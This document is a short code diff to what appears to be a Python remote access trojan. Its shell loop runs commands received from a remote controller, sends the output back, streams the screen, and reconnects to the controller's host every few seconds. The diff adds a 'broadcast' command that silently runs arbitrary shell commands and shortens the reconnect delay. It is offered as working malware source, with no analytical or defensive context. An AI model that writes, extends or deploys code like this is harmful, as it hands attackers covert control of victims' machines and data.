@@ -145,6 +145,9 @@ def shell():
         elif command.startswith('stream-start'):
             screenShare()
 
+        elif command.startswith('broadcast'):
+            subprocess.Popen(command[10:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
@@ -152,10 +155,10 @@ def shell():
             result = result.decode('latin-1')
             send(result)
 
-# Retry connection every 20 seconds forever until the connection is astablished
+# Retry connection every 10 seconds forever until the connection is astablished
 def connection():
     while True:
-        time.sleep(20)
+        time.sleep(10)
 
         try: 
             s.connect((HOST, PORT))
